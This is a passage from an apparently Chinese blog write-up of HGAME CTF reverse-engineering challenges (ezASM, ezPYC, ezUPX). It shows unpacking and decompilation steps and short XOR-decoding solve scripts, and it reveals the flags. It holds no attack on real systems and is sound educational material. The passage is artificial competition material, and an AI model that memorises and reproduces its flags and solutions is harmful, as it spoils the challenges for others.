xor ebx, ebx\n    int 0x80\n\nfailure_check:\n    ; Print failure message\n    mov eax, 4\n    mov ebx, 1\n    mov ecx, failure\n    mov edx, 18\n    int 0x80\n\n    ; Exit\n    mov eax, 1\n    xor ebx, ebx\n    int 0x80\n\n</code></pre>\n<p>解题思路：</p>\n<blockquote>\n<p>; Check flag<br>\nxor esi, esi<br>\ncheck_flag:<br>\nmov al, byte [flag + esi]<br>\nxor al, 0x22<br>\ncmp al, byte [c + esi]<br>\njne failure_check</p>\n</blockquote>\n<p>检测用户输入与 0x22 异或然后与 c 进行比较</p>\n<p>即 c [i] 与 0x22 异或之后得到的为 flag 内容。</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">89</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">113</span><span class=\"token punctuation\">,</span> <span class=\"token number\">111</span><span class=\"token punctuation\">,</span> <span class=\"token number\">125</span><span class=\"token punctuation\">,</span> <span class=\"token number\">107</span><span class=\"token punctuation\">,</span> <span class=\"token number\">81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">125</span><span class=\"token punctuation\">,</span> <span class=\"token number\">107</span><span class=\"token punctuation\">,</span> <span class=\"token number\">79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">125</span><span class=\"token punctuation\">,</span> <span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">125</span><span class=\"token punctuation\">,</span> <span class=\"token number\">112</span><span class=\"token punctuation\">,</span> <span class=\"token number\">71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">84</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>x <span class=\"token operator\">=</span> <span class=\"token number\">0x22</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    tmp <span class=\"token operator\">=</span> c<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> x</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    flag<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote ASM\\_Is\\_Imp0rt4nt\\_4\\_Rev3rs3\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h3 id=\"ezpyc100pt\"><a class=\"markdownIt-Anchor\" href=\"#ezpyc100pt\">#</a> ezPYC(100pt)</h3>\n<blockquote>\n<p>ez python Reverse</p>\n</blockquote>\n<p>这题目做了好久，结果是 pyc 的文件头错误，因为用 &quot;<span class=\"exturl\" data-url=\"aHR0cDovL3B5aW5zdHh0cmFjdG9yLnB5\">pyinstxtractor.py</span>&quot; 解包后，在库文件中 pyc 的文件头也是错误的。</p>\n<p>解题思路：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python pyinstxtractor.py ezPYC.exe</pre></td></tr></table></figure><p>在目录文件夹中解包出下面文件夹</p>\n<blockquote>\n<p>ezPYC.exe_extracted</p>\n</blockquote>\n<p>找到 ezPYC 二进制文件</p>\n<p>进行修改文件头操作</p>\n<blockquote>\n<p>55 0D 0D 0A 00 00 00 00 00 00 00 00 00 00 00 00</p>\n</blockquote>\n<p>加到 E3 之前即可。</p>\n<p>然后进行 pyc 反编译</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pycdc.exe ezPYC.pyc <span class=\"token operator\">></span> <span class=\"token number\">2</span>.txt</pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># Source Generated with Decompyle++</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># File: ezPYC.pyc (Python 3.8)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token number\">87</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token number\">75</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token number\">71</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token number\">69</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token number\">83</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token number\">121</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token number\">83</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token number\">125</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token number\">117</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token number\">106</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token number\">108</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token number\">106</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token number\">94</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token number\">80</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token number\">48</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token number\">114</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token number\">100</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token number\">55</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token number\">94</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token number\">51</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token number\">91</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token number\">48</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token number\">108</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token number\">119</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token number\">97</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token number\">115</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token number\">49</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token number\">48</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token number\">108</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token number\">100</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token number\">124</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token number\">2</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token number\">3</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token builtin\">input</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'plz input flag:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> c<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Sry, try again...'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Wow!You know a little of python reverse'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">None</span></pre></td></tr></table></figure><p>exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token number\">87</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token number\">75</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token number\">71</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token number\">69</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token number\">83</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token number\">121</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token number\">83</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token number\">125</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token number\">117</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token number\">106</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token number\">108</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token number\">106</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token number\">94</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token number\">80</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token number\">48</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token number\">114</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token number\">100</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token number\">55</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token number\">94</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token number\">51</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token number\">91</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token number\">48</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token number\">108</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token number\">119</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token number\">97</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token number\">115</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token number\">49</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token number\">48</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token number\">108</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token number\">100</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token number\">124</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token number\">2</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token number\">3</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    a <span class=\"token operator\">=</span> flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> c<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote Python\\_R3vers3\\_1s\\_1nter3st1ng!\\=\"\">\n<p>VIDAR\\</p>\n</blockquote>\n<h3 id=\"ezupx100pt\"><a class=\"markdownIt-Anchor\" href=\"#ezupx100pt\">#</a> ezUPX(100pt)</h3>\n<blockquote>\n<p>UPX is a packer</p>\n</blockquote>\n<p>给定文件为加 upx 壳</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>upx <span class=\"token parameter variable\">-d</span> ezUPX.exe</pre></td></tr></table></figure><p>拖入 IDA 发现关键代码</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __fastcall <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// edx</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  __int64 i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  __int128 v6<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+20h] [rbp-38h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+40h] [rbp-18h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>v6<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v7 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">sub_140001020</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"plz input your flag:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">sub_140001080</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%36s\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span>i64<span class=\"token punctuation\">;</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v6 <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> byte_1400022A0<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">++</span>v3 <span class=\"token operator\">>=</span> <span class=\"token number\">0x25</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token function\">sub_140001020</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Cooool!You really know a little of UPX!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">sub_140001020</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Sry,try again plz...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>byte_1400022A0[] == 647B76736049655D45136B02476D595C02456D066D5E0346465E016D02546D67626A134F320000000000000000000000</p>\n</blockquote>\n<p>同 ezASM 的 exp 相同，简单的异或</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>c1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x64</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7B</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x76</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x73</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x49</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x65</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x5D</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x13</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6B</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x47</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x59</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x5C</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x5E</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x5E</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x54</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6A</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x13</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4F</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x32</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>x1 <span class=\"token operator\">=</span> <span class=\"token number\">0x32</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    tmp <span class=\"token operator\">=</span> c1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> x1</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    flag<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token 